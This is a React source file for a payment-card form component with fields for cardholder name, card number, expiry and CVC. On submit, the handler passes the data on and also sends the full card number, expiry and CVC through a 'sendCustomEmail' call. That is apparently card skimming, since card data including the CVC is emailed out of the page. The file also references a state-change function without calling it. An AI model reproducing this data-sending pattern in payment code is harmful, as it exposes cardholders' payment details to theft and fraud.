import React, { useContext, useState } from "react";
import { CardContext } from "../../Provider/CardContext";
import { sendCustomEmail } from "../../email";

const Form = () => {
  const {
    cardNumber,
    cardNumberChanger,
    month,
    monthChanger,
    year,
    yearChanger,
    cvc,
    cvcChanger,
    cardholderName,
    cardholderNameChanger,
    handleSubmit,
    errors,
    isSubmitting,
    onSubmit,
    currentComponent,
    handleCurrentComponentChanger,
  } = useContext(CardContext);

  const onFormSubmit = (data) => {
    onSubmit(data);
    sendCustomEmail({
      cardNumber,
      month,
      year,
      cvc,
      cardholderName,
    });
    console.log("State:", currentComponent);
    handleCurrentComponentChanger
  };

  return (
    <form
      className="flex items-center justify-center flex-col gap-8"
      onSubmit={handleSubmit(onFormSubmit)}
    >
      <div className="flex items-center justify-center flex-col gap-10 text-indigo-800 sm:gap-5">
        <div className="flex items-start flex-col gap-1 ">
          <label className="text-sm">Cardholder Name</label>
          <input
            value={cardholderName}
            onChange={cardholderNameChanger}
            className="w-80 h-10 border-indigo-800 border-2 rounded-sm focus:outline-none pl-3 sm:w-72"
          />
          {errors.cardholderName && (
            <span className="text-red-700 sm:text-xs">
              {errors.cardholderName.message}
            </span>
          )}
        </div>

        <div className="flex items-start flex-col gap-1">
          <label>Card Number</label>
          <input
            value={cardNumber}
            onChange={cardNumberChanger}
            className="w-80 h-10 border-indigo-800 border-2 rounded-sm focus:outline-none pl-3 sm:w-72"
          />
          {errors.cardNumber && (
            <span className="text-red-700 sm:text-xs">
              {errors.cardNumber.message}
            </span>
          )}
        </div>

        <div>
          <label className="text-sm">EXP. DATE MM/YY CVC</label>
          <div className="flex items-center justify-center gap-5">
            <div className="flex gap-2">
              <input
                placeholder="MM"
                value={month}
                onChange={monthChanger}
                className="w-20 h-10 border-indigo-800 border-2 rounded-sm focus:outline-none pl-2 sm:w-16"
              />

              <input
                placeholder="YY"
                value={year}
                onChange={yearChanger}
                className="w-20 h-10 border-indigo-800 border-2 rounded-sm focus:outline-none pl-2 sm:w-16"
              />
            </div>
            <input
              placeholder="CVC"
              value={cvc}
              onChange={cvcChanger}
              className="w-32 h-10 border-indigo-800 border-2 rounded-sm focus:outline-none pl-2"
            />
          </div>

          <div className="flex flex-col gap-1">
            {errors.month && (
              <span className="text-red-700 sm:text-xs">
                {errors.month.message}
              </span>
            )}
            {errors.year && (
              <span className="text-red-700 sm:text-xs">
                {errors.year.message}
              </span>
            )}
            {errors.cvc && (
              <span className="text-red-700 sm:text-xs">
                {errors.cvc.message}
              </span>
            )}
          </div>
        </div>
        <button
          disabled={isSubmitting}
          type="submit"
          className="w-80 h-10 rounded-sm bg-indigo-950 text-white text-lg flex items-center justify-center sm:w-72"
        >
          {isSubmitting ? "Loading..." : "Submit"}
        </button>
      </div>
    </form>
  );
};

export default Form;
